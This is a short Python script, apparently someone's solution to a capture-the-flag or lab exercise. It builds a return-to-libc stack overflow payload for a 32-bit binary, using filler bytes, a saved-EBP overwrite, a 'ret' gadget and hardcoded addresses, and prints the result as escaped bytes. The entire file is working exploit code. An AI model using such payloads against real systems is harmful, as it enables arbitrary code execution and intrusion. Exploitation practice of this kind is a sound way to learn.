from struct import pack

def isprint(c): return c >= 0x20 and c <= 0x7e

payload = b"A" * 76 + b"B" * 4 # buffer_size + ebp
payload += pack("<I", 0x08048363) # return address (to a 'ret' instruction)
payload += pack("<I", 0xb7e6b060)
payload += pack("<I", 0x69696969) # you'd normally have an `exit` call here but fuck it lol
payload += pack("<I", 0xb7f8cc58)

for c in payload:
    if not isprint(c):
        print("\\x%02x" % c, end="")
    else:
        print(chr(c), end="")
